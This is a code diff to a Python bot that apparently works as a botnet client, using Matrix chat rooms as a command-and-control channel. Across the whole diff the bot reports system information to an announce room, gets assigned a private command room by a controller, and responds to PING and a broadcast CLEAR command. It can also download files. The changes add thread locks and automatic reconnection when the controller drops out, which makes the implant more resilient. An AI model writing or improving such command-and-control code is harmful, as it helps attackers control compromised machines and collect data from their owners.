@@ -32,12 +32,15 @@ class Bot:
     command_listener: uuid.UUID
     
     last_ping: float = 0
-    ping_timeout_treshold: float = 10
+    ping_timeout_treshold: float = 9
     
     def __init__(self):
         self.got_room = False
         self.bot_id = str(uuid.uuid4())
         self.client = MatrixClient(MATRIX_HOMESERVER)
+        
+        self.room_lock = threading.RLock()  # for room state changes
+        self.ping_lock = threading.Lock()   # for ping timing updates
 
     def login(self):
         # login and sync
@@ -59,23 +62,24 @@ class Bot:
             
     def join_room(self, roomid) -> Room:
         # check if already joined, if not join the room
-        try:
-            room: Room = self.client.rooms[roomid]
-            print(f"Already joined room: {room.name}")
-        except KeyError:
-            room: Room = self.client.join_room(roomid)
-            print(f"Joined room: {room.name}")
-        return room
+        with self.room_lock:
+            try:
+                room: Room = self.client.rooms[roomid]
+            except KeyError:
+                room: Room = self.client.join_room(roomid)
+            return room
         
     def announce(self):
-        status = self.announce_room.send_text(
-            f"CONNECT:{self.get_system_info()}"
-        )
+        with self.room_lock:
+            self.announce_room.send_text(
+                f"CONNECT:{self.get_system_info()}"
+            )
         
     def disconnect(self):
-        self.announce_room.send_text(
-            f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
-        )
+        with self.room_lock:
+            self.announce_room.send_text(
+                f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
+            )
     
     def download_file(self, event, download_dir="downloads") -> str:
         content = event["content"]
@@ -128,35 +132,83 @@ class Bot:
         
         botid, roomid = msgbody.removeprefix("RESOLVE ").split(":", 1)
         if botid == self.bot_id:
-            self.got_room = True
-            self.command_room = self.join_room(roomid)
-            self.announce_room.remove_listener(self.announce_listener)
-            self.command_listener = self.command_room.add_listener(self.on_command, event_type="m.room.message")
-            self.last_ping = time.time()
+            print("RESOLVING TO", roomid)
+            with self.room_lock:
+                self.got_room = True
+                self.command_room = self.join_room(roomid)
+                self.announce_room.remove_listener(self.announce_listener)
+                self.command_listener = self.command_room.add_listener(self.on_command, event_type="m.room.message")
+            with self.ping_lock:
+                self.last_ping = time.time()
                 
     def on_command(self, room, event):
         msgbody: str = event["content"]["body"]
         _, command = msgbody.split(":", 1)
         if command == "PING":
-            self.announce_room.send_text(
-                f"PONG:{self.command_room.room_id}:{self.bot_id}"
-            )
-            self.last_ping = time.time()
+            with self.room_lock:
+                self.announce_room.send_text(
+                    f"PONG:{self.command_room.room_id}:{self.bot_id}"
+                )
+            with self.ping_lock:
+                self.last_ping = time.time()
+                
+        elif command.startswith("CLEAR"):
+            command, targets = command.split(":")
+            if targets == "ALL" or targets == self.bot_id:
+                with self.room_lock:
+                    self.command_room.leave()
+                self.start_room_search()
+                
         else:
             print(msgbody)
             
     def make_announcement_listener(self) -> uuid.UUID:
-        return self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
-            
+        with self.room_lock:
+            return self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
+    
     def check_pings(self):
         while True:
+            should_restart = False
             time.sleep(self.ping_timeout_treshold)
-            # didn't receive two pings -> controller went offline -> start searching again
-            if time.time() - self.last_ping > self.ping_timeout_treshold * 2:
-                print("controller offline, starting search again")
-                self.got_room = False
+            
+            with self.ping_lock:
+                current_time = time.time()
+                ping_age = current_time - self.last_ping
+                
+            with self.room_lock:
+                # didn't receive three pings -> controller went offline -> start searching again
+                if self.got_room and ping_age > self.ping_timeout_treshold * 3:
+                    print("controller offline, starting search again")
+                    should_restart = True
+                    
+            if should_restart:
+                self.start_room_search()
+                    
+    def start_room_search(self):
+        with self.room_lock:
+            self.got_room = False
+            
+            # clean up
+            try:
                 self.command_room.remove_listener(self.command_listener)
+            except Exception as e:
+                print(f"Error removing command listener: {e}")
+            
+            self.command_room = None
+            self.command_listener = None
+            
+            # set announcement listener if not already set
+            if not self.announce_listener and self.announce_room:
                 self.announce_listener = self.make_announcement_listener()
+        
+    def announcement_loop(self):
+        while True:
+            should_announce = False
+            with self.room_lock:
+                should_announce = not self.got_room
+            if should_announce:
+                self.announce()
+            time.sleep(5)
             
     def run(self):
         self.login()
@@ -175,13 +227,9 @@ class Bot:
         
         threading.Thread(name="PING THREAD", target=self.check_pings, daemon=True).start()
         
-        while True:
-            if not self.got_room:
-                self.announce()
-                time.sleep(5) # TODO: In real world a minute or so
+        self.start_room_search()
+        self.announcement_loop()
 
-        
-        
 
 if __name__ == "__main__":
     bot = Bot()
